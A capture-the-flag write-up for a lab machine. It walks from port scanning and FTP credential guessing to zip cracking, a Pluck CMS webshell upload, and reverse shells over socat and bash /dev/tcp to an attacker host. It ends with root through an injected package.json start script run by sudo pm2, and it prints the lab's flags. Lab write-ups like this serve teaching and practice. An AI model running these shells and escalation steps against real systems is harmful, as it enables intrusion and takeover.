![](assets/images/banner.png)



<img src="assets/images/htb.png" style="margin-left: 20px; zoom: 60%;" align=left />    	<font size="10">Machine Name</font>

​		DD<sup>th</sup> March 2022

​		Machine Author(s): evanTheGreat

​		

 



### Description:

This machine can be easy if you pay full attention. 

### Difficulty:

`easy`

### Flags:

User: `2b1b3240f33fea7ce207a18a8c8640d4`

Root: `b2e7d04a3074a11a612cd9d8dcbf9124`

# Enumeration

We start the enumeration process with a simple Nmap scan:
```
└─$ nmap -p- 172.16.118.131  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-18 04:38 EST
Nmap scan report for 172.16.118.131
Host is up (0.00071s latency).
Not shown: 65530 filtered ports
PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
3000/tcp open   ppp
```

We do an additional Nmap scan to understand a bit more on the specifics of the services running:
```
└─$ nmap -p21,22,80,3000 -A 172.16.118.131
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-18 05:00 EST
Nmap scan report for 172.16.118.131
Host is up (0.00067s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b3:bf:6a:9b:b2:36:02:7d:f7:6b:c8:86:d8:f5:1c:b6 (RSA)
|   256 0a:40:55:b3:83:3d:b4:e8:72:87:33:14:3c:a7:dc:b5 (ECDSA)
|_  256 d4:75:40:c2:f8:aa:8c:fb:e5:31:2c:3c:01:92:a8:12 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Building House
3000/tcp open  http    Node.js Express framework
|_http-title: BuildingHome
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We observe an FTP version (3.0.3) but there are no known vulnerabilities, so we will start by trying to log in.
We try some standard credentials (admin:admin, ftp:ftp etc) but nothing seems to work:

```
└─$ ftp 172.16.118.131
Connected to 172.16.118.131.
220 (vsFTPd 3.0.3)
Name (172.16.118.131:kali): ftp
530 Permission denied.
Login failed.
ftp> 
```

So we will move on for now to other ports.


We will start with port 80. It seems to give a static site without much on it


We run `gobuster` to find potential directories:

```
└─$ gobuster dir -u http://172.16.118.131 -w /usr/share/dirb/wordlists/common.txt
...
...
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/app                  (Status: 301) [Size: 314] [--> http://172.16.118.131/app/]
/.htaccess            (Status: 403) [Size: 279]                                 
/cms                  (Status: 301) [Size: 314] [--> http://172.16.118.131/cms/]
/index.php            (Status: 200) [Size: 2823]                                
/javascript           (Status: 301) [Size: 321] [--> http://172.16.118.131/javascript/]
/server-status        (Status: 403) [Size: 279]                                        
                                                                                       
===============================================================
2021/11/18 12:41:15 Finished
===============================================================
```

Apart from the standard directories (like `javascript`), we see also two interesting ones `app` and `cms`.

We look at the `app` directory first, and seems to give us files of an application.

If we check the `README` file seems to be a react app. We will keep that information and move on.

On the `cms` endpoint we seem to get a CMS page, but not much else

We run another `gobuster` to see if we can uncover any interesting paths

```
└─$ gobuster dir -u http://172.16.118.131/cms -w /usr/share/dirb/wordlists/common.txt
...
...
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/admin.php            (Status: 200) [Size: 3914]
/data                 (Status: 301) [Size: 319] [--> http://172.16.118.131/cms/data/]
/docs                 (Status: 301) [Size: 319] [--> http://172.16.118.131/cms/docs/]
/files                (Status: 301) [Size: 320] [--> http://172.16.118.131/cms/files/]
/images               (Status: 301) [Size: 321] [--> http://172.16.118.131/cms/images/]
/index.php            (Status: 302) [Size: 0] [--> http://172.16.118.131/cms/?file=my-site]
/robots.txt           (Status: 200) [Size: 47]                                        
```

Let's try the admin.php page:

We see that it requires a password which we don't have, but more interestingly we find that this is a page of the `Pluck CMS` and version 4.7.13

We will use `searchsploit` to check any vulnerabilities. First we update it with `sudo searchsploit -u` to get the most updated database (takes some time, so alternatively we can look directly to ExploitDB website)

Looking at searchsploit we find a potential vulnerability for Remote Command Execution through file upload, but it requires authentication

```
└─$ searchsploit pluck cms 4.7.13
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)                                          | php/webapps/49909.py
```

There does not seem we can do much else, so we keep that information and we will move to port 3000.

On that port we look around and see an interesting message

Seems that we get information that `norman` loves his dog named "isabel" and he can build FTP servers.

Let's see if that could give us credentials. We try `norman:isabel`:

```
└─$ ftp 172.16.118.131
Connected to 172.16.118.131.
220 (vsFTPd 3.0.3)
Name (172.16.118.131:kali): norman
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

We see that we are successful. We try now to find any valuable files, and we find a hidden directory `.archives` with some subdirectories. After looking around we find a zip file:

```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Nov 18 01:36 .
drwxr-xr-x    3 0        0            4096 Nov 18 01:36 ..
dr-xr-xr-x    5 65534    65534        4096 Nov 18 01:36 .archives
226 Directory send OK.
ftp> cd .archives
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    2 65534    65534        4096 Nov 18 01:36 config
dr-xr-xr-x    2 65534    65534        4096 Nov 18 01:36 logs
dr-xr-xr-x    2 65534    65534        4096 Nov 18 01:36 old
226 Directory send OK.
ftp> cd old
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    2 65534    65534        4096 Nov 18 01:36 .
dr-xr-xr-x    5 65534    65534        4096 Nov 18 01:36 ..
-rw-r--r--    1 65534    65534      111084 Nov 18 01:36 .archive.zip
226 Directory send OK.
ftp> 
```

We download the zip file with `get .archive.zip` and try to unzip it:
```
└─$ unzip .archive.zip
Archive:  .archive.zip
[.archive.zip] old.tar.gz password: 
   skipping: old.tar.gz              incorrect password
```

We see that the zip is password protected. Let's see if we can crack it using `zip2john`. We will follow the next steps:
1. Use `zip2john` to generate the hash from the archive
2. Use `john` to get the password from the hash

```
└─$ zip2john .archive.zip > hash                             
ver 2.0 efh 5455 efh 7875 .archive.zip/old.tar.gz PKZIP Encr: 2b chk, TS_chk, cmplen=110898, decmplen=110957, crc=2C71DFEC
                                                                                                        
┌──(kali㉿kali)-[~/Desktop/VMs/my-vm/dress-reh]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
wombat1          (.archive.zip/old.tar.gz)
1g 0:00:00:00 DONE (2021-11-18 11:52) 50.00g/s 6963Kp/s 6963Kc/s 6963KC/s korn13..katiekatie
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Indeed we get the password as `wombat1`

We now unzip the file:

```
└─$ unzip .archive.zip
Archive:  .archive.zip
[.archive.zip] old.tar.gz password: 
  inflating: old.tar.gz         
```

It gives a tar.gz file. Let's extract using tar:

```
└─$ tar -xvf old.tar.gz
old/
old/.gitignore
old/fuel/
old/fuel/install/
....
....
old/assets/pdf/index.html
old/index.php
old/robots.txt
old/composer.json
old/.htaccess
old/README.md
```

We get what seems to be a folder structure of Fuel CMS. 

We look around to find interesting information, and we see the following under `old/fuel/application/config/database.php`:

```
└─$ cat  database.php 
<?php
defined('BASEPATH') OR exit('No direct script access allowed');
...
...
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'fuel_user',
        'password' => 'CharlesTreePokemon44',
        'database' => 'cms',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}
```

We find a password `CharlesTreePokemon44`

We can try this with SSH (for example for the `norman` user) but we don't get anywhere.

# Foothold

Since we already found the exploit for Pluck CMS, let's see if we can use this password.

```
└─$ python3 exploit.py 172.16.118.131 80 CharlesTreePokemon44 /cms

Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://172.16.118.131:80/cms/files/shell.phar
```

Indeed it works and seems that it has uploaded a webshell in the cms directory as the user `www-data`.

## Escalation

Although this is a decent shell, we want to have a more stable one, more functional if we need to edit files for example.

Let's use socat.

First we get the executable on the target box (socat can be downloaded from here: https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)

We start a python listener to the relevant directory we have the executable

```
└─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

And from the target machine we go to `/dev/shm` and use `wget`to get the binary and give it execution permissions:

```
p0wny@shell:/dev/shm# wget 172.16.118.132/socat
--2021-11-18 09:09:30--  http://172.16.118.132/socat
Connecting to 172.16.118.132:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: 'socat'

     0K .......... .......... .......... .......... .......... 13% 11.7M 0s
    50K .......... .......... .......... .......... .......... 27% 43.8M 0s
   100K .......... .......... .......... .......... .......... 40% 29.7M 0s
   150K .......... .......... .......... .......... .......... 54% 47.4M 0s
   200K .......... .......... .......... .......... .......... 68% 27.5M 0s
   250K .......... .......... .......... .......... .......... 81% 44.9M 0s
   300K .......... .......... .......... .......... .......... 95% 39.3M 0s
   350K .......... ......                                     100%  168M=0.01s

2021-11-18 09:09:30 (29.4 MB/s) - 'socat' saved [375176/375176]


p0wny@shell:/dev/shm# chmod +x socat
```

Now on our kali box we stop the python listener and start socat

```
└─$ socat file:`tty`,raw,echo=0 tcp-listen:3000
```

And from the webshell we send the reverse shell

```
p0wny@shell:/dev/shm# ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.16.118.132:3000
```

Back on our Kali we got our shell

```
└─$ socat file:`tty`,raw,echo=0 tcp-listen:3000
www-data@easypeasy:/dev/shm$ ls
socat
www-data@easypeasy:/dev/shm$ whoami
www-data
www-data@easypeasy:/dev/shm$ 
```

# Lateral Movement

Now we go to see the users and we see ellie and norman:

```
www-data@easypeasy:/home$ ls -la
total 20
drwxr-xr-x  5 root   root   4096 Nov 18 01:37 .
drwxr-xr-x 20 root   root   4096 Nov  6 10:11 ..
drwxr--r--  2 ellie  ellie  4096 Nov 18 01:37 ellie
drwxr-xr-x  3 root   root   4096 Nov 18 01:36 norman
```

We can't get to the folder of `ellie`.

We can try to see if there is password re-use case. So we try `ellie:CharlesTreePokemon44`

```
www-data@easypeasy:/home$ su ellie
Password: 
$ id
uid=1002(ellie) gid=1002(ellie) groups=1002(ellie)
$ 
```

Indeed we get in as `ellie`. Now we go in the local folder and we get the flag of local.txt

```
$ cd ellie
$ ls -la
total 36
drwxr--r-- 5 ellie ellie 4096 Nov 18 09:14 .
drwxr-xr-x 5 root  root  4096 Nov 18 01:37 ..
lrwxrwxrwx 1 root  root     9 Nov 18 01:37 .bash_history -> /dev/null
-rw-r--r-- 1 ellie ellie  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ellie ellie 3771 Feb 25  2020 .bashrc
drwxr-xr-x 4 ellie ellie 4096 Nov 18 09:14 .cache
drwx------ 4 ellie ellie 4096 Nov 18 09:14 .config
drwxr-xr-x 3 ellie ellie 4096 Nov 18 09:14 .local
-rw-r--r-- 1 ellie ellie   33 Nov 18 01:37 local.txt
-rw-r--r-- 1 ellie ellie  807 Feb 25  2020 .profile
$ wc -c local.txt
33 local.txt
$ 
```

Let's see what else we can find for this user. We try `sudo -l`

```
$ sudo -l
Matching Defaults entries for ellie on easypeasy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ellie may run the following commands on easypeasy:
    (ALL) NOPASSWD: /usr/local/bin/pm2
```

It seems the user can execute `pm2` with sudo/root permissions. That is definitely something to explore.

# Privilege Escalation

PM2 is a utility for managing nodejs/npm based applications. We can see the running ones by running `pm2 list`

```
$ sudo pm2 list
┌─────┬────────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name       │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼────────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0   │ HomeApp    │ default     │ N/A     │ fork    │ 30824    │ 7h     │ 0    │ online    │ 0%       │ 66.1mb   │ root     │ disabled 
```

We see that we have 1 application named HomeApp running as `root`

If there could be a way to start/restart such app and generate a reverse shell out of it, we could catch it as `root`

We go to check the relevant react app that we found on port 80:

```
$ cd /var/www/html/app
$ ls
node_modules  package.json  package-lock.json  public  README.md  src
$ ls -la
total 816
drwxr-xr-x    6 www-data www-data   4096 Nov 18 01:37 .
drwxr-xr-x    4 www-data www-data   4096 Nov 18 01:36 ..
-rwxr-xr-x    1 www-data www-data   6148 Nov 15 08:43 .DS_Store
-rwxr-xr-x    1 www-data www-data     13 Nov 15 08:43 .env
drwxr-xr-x    7 www-data www-data   4096 Nov 15 08:43 .git
-rwxr-xr-x    1 www-data www-data    310 Nov 15 08:43 .gitignore
drwxr-xr-x 1051 www-data www-data  36864 Nov 18 01:37 node_modules
-rwxr-xr-x    1 www-data www-data    794 Nov 17 12:30 package.json
-rwxr-xr-x    1 www-data www-data 749278 Nov 18 01:37 package-lock.json
drwxr-xr-x    2 www-data www-data   4096 Nov 15 08:43 public
-rwxr-xr-x    1 www-data www-data   2891 Nov 15 08:43 README.md
drwxr-xr-x    3 www-data www-data   4096 Nov 15 08:43 src
```

And if we display the contents of the manage package manager file `package.json`:

```
$ cat package.json
{
  "name": "react-multi-page-website",
  "version": "0.1.0",
  "private": true,
  "dependencies": {
    "@testing-library/jest-dom": "^4.2.4",
    "@testing-library/react": "^9.4.0",
    "@testing-library/user-event": "^7.2.1",
    "react": "^16.12.0",
    "react-dom": "^16.12.0",
    "react-router-dom": "^5.1.2",
    "react-scripts": "4.0.3"
  },
  "scripts": {
    "start": "react-scripts start",
    "build": "react-scripts build",
    "test": "react-scripts test",
    "eject": "react-scripts eject"
  },
  "eslintConfig": {
    "extends": "react-app"
  },
  "browserslist": {
    "production": [
      ">0.2%",
      "not dead",
      "not op_mini all"
    ],
    "development": [
      "last 1 chrome version",
      "last 1 firefox version",
      "last 1 safari version"
    ]
  }
}
```

Checking the file, we see that there is a json object `scripts`, which defines what commands run when the application starts, gets built etc. We will focus on the `start` script. If we can change this to a reverse shell command, we could potentially escalate.

We can't edit the file as `ellie` so let's exit and edit as `www-data`

```
"scripts": {
    "start": "bash -c 'bash -i >& /dev/tcp/172.16.118.132/80 0>&1'",
    "build": "react-scripts build",
    "test": "react-scripts test",
    "eject": "react-scripts eject"
  },
```

We save the file, and log in back as `ellie`. 
We also start a netcat listener on Kali

```
└─$ sudo nc -lvp 80                       
[sudo] password for kali: 
listening on [any] 80 ...
```

And we execute pm2 with the `start` script:

```
$ sudo pm2 start npm -- start
[PM2] Starting /usr/bin/npm in fork_mode (1 instance)
[PM2] Done.
```

Back in our Kali we got the shell as `root`:

```
└─$ sudo nc -lvp 80                       
[sudo] password for kali: 
listening on [any] 80 ...
172.16.118.131: inverse host lookup failed: Unknown host
connect to [172.16.118.132] from (UNKNOWN) [172.16.118.131] 56772
bash: cannot set terminal process group (35308): Inappropriate ioctl for device
bash: no job control in this shell
root@easypeasy:/var/www/html/app# id
id
uid=0(root) gid=0(root) groups=0(root)
root@easypeasy:/var/www/html/app# 
```

So now we can go to `/root` directory and get the `proof.txt` flag.
